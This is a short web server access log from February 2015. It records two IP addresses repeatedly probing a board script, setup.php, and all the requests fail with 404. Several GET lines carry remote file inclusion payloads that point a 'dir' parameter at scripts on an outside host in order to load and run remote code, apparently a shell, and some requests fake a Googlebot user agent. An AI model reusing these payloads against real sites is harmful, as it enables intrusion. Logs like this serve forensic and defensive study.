112.218.68.155 - - [21/Feb/2015:16:36:12 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:36:12 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [21/Feb/2015:16:36:13 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [21/Feb/2015:16:36:13 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [21/Feb/2015:16:36:14 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [21/Feb/2015:16:36:14 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [21/Feb/2015:16:36:14 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [21/Feb/2015:16:36:15 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [21/Feb/2015:16:36:16 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:36:16 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:36:18 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:36:28 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [21/Feb/2015:16:36:29 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [21/Feb/2015:16:36:30 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [21/Feb/2015:16:36:30 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [21/Feb/2015:16:36:31 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
